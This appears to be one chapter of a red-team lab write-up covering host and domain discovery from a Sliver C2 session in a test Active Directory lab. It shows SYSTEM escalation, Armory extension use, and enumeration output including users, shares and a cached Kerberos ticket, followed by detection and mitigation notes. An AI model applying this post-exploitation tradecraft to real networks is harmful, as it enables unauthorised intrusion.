# Sliver Host and Domain Discovery

## Objective

This phase assessed what situational awareness could be collected from an active Sliver session without repeating the entire earlier work.

## Privilege context

The session initially ran in a domain-user context. A Sliver Armory extension was then used to obtain a new session as `NT AUTHORITY\\SYSTEM`.

The attack target was `CASTELBLACK`.

The built-in Sliver command `getsystem` spawns a new sliver session as the NT AUTHORITYT\\SYSTEM user:

```bash
[*] A new SYSTEM session should pop soon...

[*] Session c783fbf7 EXTRAORDINARY_STOCK-IN-TRADE - 10.4.10.22:52773 (castelblack) - windows/amd64 - Tue, 14 Jan 2025 16:38:15 CET

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
```

## Host and domain information

First module tried from `Armory Tools` was `c2tc-domaininfo` which was installed using `armory install c2tc-domaininfo`.

```bash
[*] Successfully executed c2tc-domaininfo (coff-loader)
[*] Got output:
--------------------------------------------------------------------
[+] DomainName:
    north.sevenkingdoms.local
[+] DomainGuid:
    {18022172-4253-4444-A36F-5F1D1F02D7FB}
[+] DnsForestName:
    sevenkingdoms.local
[+] DcSiteName:
    Default-First-Site-Name
[+] ClientSiteName:
    Default-First-Site-Name
[+] DomainControllerName (PDC):
    \\winterfell.north.sevenkingdoms.local
[+] DomainControllerAddress (PDC):
    \\10.4.10.11
[+] Default Domain Password Policy:
    Password history length: 24
    Maximum password age (d): 37201
    Minimum password age (d): 1
    Minimum password length: 5
[+] Account Lockout Policy:
    Account lockout threshold: 5
    Account lockout duration (m): 5
    Account lockout observation window (m): 5
[+] NextDc DnsHostName:
    winterfell.north.sevenkingdoms.local
--------------------------------------------------------------------
```

Other `Armory Tools` returned the following information:

```bash
# sa-arp

[*] Successfully executed sa-arp (coff-loader)
[*] Got output:

Inteface  --- 0x1
Internet Address        Physical Address        Type
224.0.0.22                                      static
239.255.255.250                                 static

Inteface  --- 0x3
Internet Address        Physical Address        Type
10.4.10.10              BC-24-11-C8-1D-AC       dynamic
10.4.10.12              BC-24-11-94-E9-1E       dynamic
10.4.10.22              BC-24-11-A1-08-74       dynamic
10.4.10.99              BC-24-11-B1-D1-76       dynamic
10.4.10.254             BC-24-11-10-C2-35       dynamic
10.4.10.255             FF-FF-FF-FF-FF-FF       static
224.0.0.22              01-00-5E-00-00-16       static
224.0.0.251             01-00-5E-00-00-FB       static
224.0.0.252             01-00-5E-00-00-FC       static
239.255.255.250         01-00-5E-7F-FF-FA       static
```

```bash
# sa-listdns

[*] Successfully executed sa-listdns (coff-loader)
[*] Got output:
Cache record: safebrowsing.googleapis.com   | TYPE 1
Cache record: meren   | TYPE 255
Cache record: storecatalogrevocation.storequality.microsoft.com   | TYPE 1
Cache record: prod.ads.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.ads.prod.webservices.mozgcp.net   | TYPE 1
Cache record: crl3.digicert.com   | TYPE 1
Cache record: www.microsoft.com   | TYPE 1
Cache record: classify-client.services.mozilla.com   | TYPE 1
Cache record: incoming.telemetry.mozilla.org   | TYPE 1
Cache record: incoming.telemetry.mozilla.org   | TYPE 1
Cache record: client.wns.windows.com   | TYPE 1
Cache record: castelblack   | TYPE 255
Cache record: www.amazon.de   | TYPE 1
Cache record: _kerberos._tcp.default-first-site-name._sites.dc._msdcs.sevenkingdoms.local   | TYPE 33
Cache record: e3913.cd.akamaiedge.net   | TYPE 28
Cache record: e3913.cd.akamaiedge.net   | TYPE 1
Cache record: temuaffiliateprogram.pxf.io   | TYPE 28
Cache record: temuaffiliateprogram.pxf.io   | TYPE 1
Cache record: go.microsoft.com   | TYPE 1
Cache record: push.services.mozilla.com   | TYPE 28
Cache record: push.services.mozilla.com   | TYPE 1
Cache record: content-signature-2.cdn.mozilla.net   | TYPE 1
Cache record: content-signature-2.cdn.mozilla.net   | TYPE 1
Cache record: partnerprogramm.otto.de   | TYPE 28
Cache record: partnerprogramm.otto.de   | TYPE 1
Cache record: prod.balrog.prod.cloudops.mozgcp.net   | TYPE 28
Cache record: prod.balrog.prod.cloudops.mozgcp.net   | TYPE 1
Cache record: settings-win.data.microsoft.com   | TYPE 1
Cache record: ctldl.windowsupdate.com   | TYPE 1
Cache record: firefox.settings.services.mozilla.com   | TYPE 1
Cache record: firefox.settings.services.mozilla.com   | TYPE 1
Cache record: telemetry-incoming.r53-2.services.mozilla.com   | TYPE 28
Cache record: telemetry-incoming.r53-2.services.mozilla.com   | TYPE 1
Cache record: o.pki.goog   | TYPE 1
Cache record: services.addons.mozilla.org   | TYPE 28
Cache record: services.addons.mozilla.org   | TYPE 1
Cache record: x1.c.lencr.org   | TYPE 1
Cache record: north   | TYPE 255
Cache record: prod.classify-client.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.classify-client.prod.webservices.mozgcp.net   | TYPE 1
Cache record: ocsp.digicert.com   | TYPE 1
Cache record: c.pki.goog   | TYPE 1
Cache record: fp2e7a.wpc.phicdn.net   | TYPE 28
Cache record: fp2e7a.wpc.phicdn.net   | TYPE 1
Cache record: captive.apple.com   | TYPE 1
Cache record: _ldap._tcp.default-first-site-name._sites.winterfell.north.sevenkingdoms.local   | TYPE 255
Cache record: _ldap._tcp.winterfell.north.sevenkingdoms.local   | TYPE 255
Cache record: sls.update.microsoft.com   | TYPE 1
Cache record: wpad   | TYPE 255
Cache record: bravos   | TYPE 255
Cache record: _ldap._tcp.default-first-site-name._sites.dc._msdcs.sevenkingdoms.local   | TYPE 33
Cache record: login.live.com   | TYPE 1
Cache record: pti.store.microsoft.com   | TYPE 255
Cache record: aus5.mozilla.org   | TYPE 1
Cache record: aus5.mozilla.org   | TYPE 1
Cache record: kingslanding.sevenkingdoms.local   | TYPE 1
Cache record: pki-goog.l.google.com   | TYPE 28
Cache record: pki-goog.l.google.com   | TYPE 1
Cache record: djvbdz1obemzo.cloudfront.net   | TYPE 28
Cache record: djvbdz1obemzo.cloudfront.net   | TYPE 1
Cache record: normandy-cdn.services.mozilla.com   | TYPE 28
Cache record: normandy-cdn.services.mozilla.com   | TYPE 1
Cache record: normandy.cdn.mozilla.net   | TYPE 1
Cache record: prod.content-signature-chains.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.content-signature-chains.prod.webservices.mozgcp.net   | TYPE 1
Cache record: ads.mozilla.org   | TYPE 1
Cache record: 5711392c-c31b-4fd4-a7e1-db40767d2c08._msdcs.sevenkingdoms.local   | TYPE 5
Cache record: definitionupdates.microsoft.com   | TYPE 1
Cache record: prod.remote-settings.prod.webservices.mozgcp.net   | TYPE 28
Cache record: prod.remote-settings.prod.webservices.mozgcp.net   | TYPE 1
```

```bash
# sa-netloggedon

[*] Successfully executed sa-netloggedon (coff-loader)
[*] Got output:
Users logged on:
---------------------winterfell.north.sevenkingdoms.local----------------------------------

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: eddard.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: robb.stark
Domain:       NORTH
Oth_domains:
Logon server: WINTERFELL

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:

Username: WINTERFELL$
Domain:       NORTH
Oth_domains:
Logon server:
```

```bash
sa-netshares

[*] Successfully executed sa-netshares (coff-loader)
[*] Got output:
Share:
---------------------(Local)----------------------------------
ADMIN$
C$
IPC$
NETLOGON
RobbStark$
SYSVOL
```

```bash
# sa-reg-session
[*] Successfully executed sa-regsession (coff-loader)
[*] Got output:
[*] Querying local registry...
-----------Registry Session---------
UserSid: S-1-5-21-58534182-3680670537-1634125476-1111
Host: winterfell.north.sevenkingdoms.local
---------End Registry Session-------

-----------Registry Session---------
UserSid: S-1-5-21-58534182-3680670537-1634125476-1113
Host: winterfell.north.sevenkingdoms.local
---------End Registry Session-------

[*] Found 2 sessions in the registry
```

## Kerberos ticket visibility

The `c2tc-klist` extension showed a cached Kerberos ticket for `eddard/stark` on `WINTERFELL`:

```bash
[*] Successfully executed c2tc-klist (coff-loader)
[*] Got output:

Cached Tickets: (1)

#0>	Client: eddard.stark @ NORTH.SEVENKINGDOMS.LOCAL
	Server: host/winterfell @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: (18) AES256_CTS_HMAC_SHA1_96
	Ticket Flags: 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 1/14/2025 12:17:27
	End Time:   1/14/2025 22:17:27
	Renew Time: 0
	Session Key Type: (23) RC4_HMAC_NT
	Cache Flags: 0x8 -> ASC
	Kdc Called:
```

## Result

The active session provided a view of:

- Current identity and privilege
- Domain context
- Nearby systems
- Logged-on nusers
- Shares and name-resloution data
- Cached Kerberos authentication statae

This information would allow an operator to prioritise actions later, while the same activity creates useful telemetry for defenders.

## Detection opportunities

- A single process performing many host, network, registry, and domain discovery actions in a short period
- ARP, DNS, share, and session enumeration from a non-administrative process
- Access to Kerberos ticket APIs by unusual programs
- Extension or reflective-module loading into an implant process
- SYSTEM-level process making unexpected discovery requests

## Mitigation

- Use endpoint detection rules that correlate multiple discovery behaviors rather than alerting on one commad in isolation
- Restrict local administrator and SYSTEM-level execution paths
- Reduce logged-on privileged sessions on server
- Segment administrative access and monitor internal recon


## Navigation

[Previous: Infrastructure and initial session](01-infrastructure-and-initial-session.md) | [Sliver index](README.md) | [Next: Credential and directory assessment](03-credential-and-directory-assessment.md)